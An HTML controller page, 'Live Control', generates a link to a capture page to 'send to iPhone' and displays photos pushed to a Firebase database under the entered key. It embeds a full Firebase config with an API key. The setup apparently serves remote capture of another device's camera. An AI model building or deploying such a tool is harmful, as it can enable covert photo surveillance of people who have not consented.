<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Live Control</title>
  <style>
    body {
      background: black;
      color: white;
      text-align: center;
      font-family: sans-serif;
      padding-top: 50px;
    }
    input {
      padding: 10px;
      font-size: 18px;
      width: 250px;
    }
    button {
      padding: 10px;
      font-size: 16px;
      margin-left: 10px;
    }
    img {
      margin-top: 20px;
      max-width: 90%;
      border: 2px solid white;
    }
  </style>
</head>
<body>
  <h2>Enter Your Private Key</h2>
  <input type="text" id="keyInput" placeholder="e.g. mypass123">
  <button onclick="generateLink()">Generate Link</button>
  <p id="linkDisplay"></p>
  <img id="photo" src="" alt="Waiting for photo..." />

  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyByYx-ScUywHwz_YK_ZV7rDREBTScrWWKs",
      authDomain: "livesnap-d57c2.firebaseapp.com",
      databaseURL: "https://livesnap-d57c2-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "livesnap-d57c2",
      storageBucket: "livesnap-d57c2.firebasestorage.app",
      messagingSenderId: "24202813286",
      appId: "1:24202813286:web:02304adf2c5ffed9fab2a7",
      measurementId: "G-BR9MFH2XN6"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    function generateLink() {
      const key = document.getElementById("keyInput").value.trim();
      if (!key) return alert("Please enter a valid key");
      const link = window.location.origin + "/capture.html?key=" + encodeURIComponent(key);
      document.getElementById("linkDisplay").innerHTML = `<b>Send this link to iPhone:</b><br><a style='color:lime' href="${link}" target="_blank">${link}</a>`;

      db.ref("livephoto/" + key).on("value", snapshot => {
        const data = snapshot.val();
        if (data && data.image) {
          document.getElementById("photo").src = data.image;
        }
      });
    }
  </script>
</body>
</html>
